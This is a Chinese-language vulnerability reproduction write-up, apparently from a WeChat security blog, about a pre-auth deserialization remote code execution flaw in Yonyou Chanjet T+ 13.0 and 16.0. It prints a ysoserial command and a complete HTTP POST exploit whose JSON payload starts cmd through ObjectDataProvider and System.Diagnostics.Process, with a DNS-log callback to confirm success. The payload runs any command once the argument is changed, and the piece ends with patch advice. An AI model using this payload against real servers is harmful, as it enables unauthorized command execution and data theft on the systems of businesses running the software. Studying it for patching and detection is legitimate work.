<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/RjzeOi4JLUL_djBOoQ2sJA)

**漏洞简介  
**

用友畅捷通 Tplus 组件存在远程代码执行漏洞，漏洞威胁等级：高危，能造成远程代码执行。

用友畅捷通 Tplus 存在前台远程代码执行漏洞，攻击者可利用 GetStoreWarehouseByStore 方法注入序列化的 payload，执行任意命令。最终造成服务器敏感性信息泄露或代码执行。  

**漏洞影响范围**：

目前受影响的版本：

畅捷通 Tplus 13.0 

畅捷通 Tplus 16.0

**漏洞复现**

使用 ysoserial.exe 生成 payload

```
ysoserial.exe -g ObjectDataProvider -f JavaScriptSerializer -c "ping dnslog" -raw

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dfviaLov8RtCRVicfIHBeUs5aDpSfwPWFrcy4R0wICYZxhHszRlpZMAnObibY7TYiafyNaIibZKN3cn348IiakTtNK3Q/640?wx_fmt=png)

使用 yakit 发送 payload，响应 "actorId 或 archivesId 不能为空" 说明利用成功  

```
POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
X-Ajaxpro-Method: GetStoreWarehouseByStore
Content-Type: text/plain
Content-Length: 553
{
 "storeID":{
  "__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
  "MethodName":"Start",
  "ObjectInstance":{
   "__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
   "StartInfo":{
    "__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
    "FileName":"cmd",
    "Arguments":"/c ping dnslog"
   }
  }
 }
}

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dfviaLov8RtCRVicfIHBeUs5aDpSfwPWFr5tTIUoQtjMkTTPGcaic1XXibcDHHr8CoicjfY2KTQ1lpUAemScwhnzo5A/640?wx_fmt=png)

查看 dnslog，收到请求![](https://mmbiz.qpic.cn/sz_mmbiz_png/dfviaLov8RtCRVicfIHBeUs5aDpSfwPWFrjqNCvSDhDZavhicMjU0dl1fpH1HGECxf3vkAvr3DyJIBkTWwicr8AsfA/640?wx_fmt=png)

**工具自动化利用**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dfviaLov8RtCRVicfIHBeUs5aDpSfwPWFr1Cg8MeBLl8hbiarpdkqiaCwc3L5wcM4wy9neTzzniciaOYlD7kwmxHQcbA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dfviaLov8RtCRVicfIHBeUs5aDpSfwPWFrKyticSaZthNnGYubWcDrUrwKnpSKyW1cmxXA3Qn6xsEibHHafEGrbkvg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dfviaLov8RtCRVicfIHBeUs5aDpSfwPWFrhL26n03h5icQR1Tzqgl8B60SXNreFTtjKcyJuLBedvqLdwJXia6XK5rw/640?wx_fmt=png)

**漏洞修复建议**

当前官方已发布安全补丁，建议受影响的用户及时联系产商安装安全补丁。链接如下：

https://www.chanjetvip.com/product/goods/